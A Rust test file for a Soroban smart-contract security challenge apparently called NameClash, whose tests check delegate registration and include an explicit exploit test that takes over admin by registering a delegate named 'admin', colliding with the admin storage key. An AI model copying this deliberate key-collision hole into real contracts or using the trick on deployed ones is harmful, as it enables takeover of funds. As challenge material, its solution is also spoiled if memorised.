extern crate std;

use super::{NameClash, NameClashClient};
use soroban_sdk::{Address, Env, Symbol, testutils::Address as _};

fn setup() -> (Env, NameClashClient<'static>, Address) {
    let env = Env::default();
    let player = Address::generate(&env);
    let issuer = Address::generate(&env);
    let token = env.register_stellar_asset_contract_v2(issuer).address();
    let id = env.register(NameClash, (&player, &token));
    let client = NameClashClient::new(&env, &id);
    (env, client, player)
}

#[test]
fn starts_owned_by_the_contract_itself() {
    let (_env, client, player) = setup();
    assert_eq!(client.admin(), client.address);
    assert!(!client.is_solved(&player));
}

#[test]
fn delegates_resolve_by_name() {
    let (env, client, player) = setup();
    env.mock_all_auths();
    let alice = Address::generate(&env);
    let name = Symbol::new(&env, "alice");

    assert_eq!(client.delegate(&name), None);
    client.add_delegate(&player, &name, &alice);
    assert_eq!(client.delegate(&name), Some(alice));
    assert_eq!(client.admin(), client.address);
}

#[test]
fn add_delegate_requires_the_callers_signature() {
    let (env, client, player) = setup();
    let name = Symbol::new(&env, "alice");
    assert!(client.try_add_delegate(&player, &name, &player).is_err());
}

/// The exploit: register a delegate whose name is the key the admin lives under.
#[test]
fn exploit_register_a_delegate_called_admin() {
    let (env, client, player) = setup();
    env.mock_all_auths();

    client.add_delegate(&player, &Symbol::new(&env, "admin"), &player);

    assert_eq!(client.admin(), player);
    assert!(client.is_solved(&player));
}

#[test]
fn only_the_owner_can_solve_their_instance() {
    let (env, client, _player) = setup();
    env.mock_all_auths();
    let other = Address::generate(&env);
    client.add_delegate(&other, &Symbol::new(&env, "admin"), &other);
    assert!(!client.is_solved(&other));
}
